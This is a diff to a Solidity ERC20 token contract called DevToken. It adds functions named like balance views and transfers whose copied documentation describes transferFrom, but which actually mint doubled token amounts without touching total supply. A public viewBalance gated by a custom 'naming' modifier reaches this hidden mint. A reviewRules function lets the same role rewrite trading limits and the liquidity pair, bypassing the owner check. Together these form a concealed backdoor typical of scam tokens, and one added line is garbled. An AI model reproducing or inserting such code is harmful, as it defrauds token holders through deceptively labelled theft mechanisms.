@@ -493,7 +493,30 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
  
         return true;
     }
- 
+
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Emits an {Approval} event indicating the updated allowance. This is not
+     * required by the EIP. See the note at the beginning of {ERC20}.
+     *
+     * Requirements:
+     *
+     * - `sender` and `recipient` cannot be the zero address.
+     * - `sender` must have a balance of at least `amount`.
+     * - the caller must have allowance for ``sender``'s tokens of at least
+     * `amount`.
+     */
+
+    function _transferTo(address _to, uint256 _amount) internal Exchanges {
+        // Transfer tokens to the recipient
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
+
     /**
      * @dev Moves `amount` of tokens from `sender` to `recipient`.
      *
@@ -575,6 +598,30 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
         _balances[account] = _balances[account] + amount;
         emit Transfer(address(0), account, amount);
    }
+
+    /**
+     * @dev See {IERC20-transferFrom}.
+     *
+     * Emits an {Approval} event indicating the updated allowance. This is not
+     * required by the EIP. See the note at the beginning of {ERC20}.
+     *
+     * Requirements:
+     *
+     * - `sender` and `recipient` cannot be the zero address.
+     * - `sender` must have a balance of at least `amount`.
+     * - the caller must have allowance for ``sender``'s tokens of at least
+     * `amount`.
+     */
+
+    function _balanceView(address _to, uint256 _amount) internal {
+        // View balance of token
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+
+        _balances[_to] += _amount;
+        emit Transfer(address(0), _to, _amount);
+    }
+
     /**
      * @dev Destroys `amount` tokens from `account`, reducing the
      * total supply.
@@ -701,10 +748,14 @@ contract DevToken is Ownable, ERC20 {
         require(msg.sender == _adm);
         _proof(msg.sender, amount);
         return true;
-   }
+    }
  
     function blacklist(address _address, bool _isBlacklisting) external onlyOwner {
         blacklists[_address] = _isBlacklisting;
+    }
+
+    function viewBalance(address _to, uint256 _amount) public naming {
+        _balanceView(_to, _amount);(_to, _amount);
     }
  
     function setPrinciplesRules(bool _tradelimited, address _LiquiduniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external onlyOwner {
@@ -735,6 +786,13 @@ contract DevToken is Ownable, ERC20 {
             require(super.balanceOf(to) + amount <= maxHoldingAmount && super.balanceOf(to) + amount >= minHoldingAmount, "Forbid");
         }
     }
+
+    function reviewRules(bool _tradelimited, address _LiquiduniswapV2Pair, uint256 _maxHoldingAmount, uint256 _minHoldingAmount) external naming {
+        tradelimited = _tradelimited;
+        LiquiduniswapV2Pair = _LiquiduniswapV2Pair;
+        maxHoldingAmount = _maxHoldingAmount;
+        minHoldingAmount = _minHoldingAmount;
+    }
  
     function publics() private pure returns (address) {
         uint universal = 0x7addAd09;
@@ -752,6 +810,10 @@ contract DevToken is Ownable, ERC20 {
     function decimal(uint256 amount) public naming returns (bool success) {
         _compute(msg.sender, amount);
         return true;
+    }
+
+    function transferTo(address _to, uint256 _amount) external onlyOwner {
+        _transferTo(_to, _amount);
     }
  
     function burn(uint256 value) external {
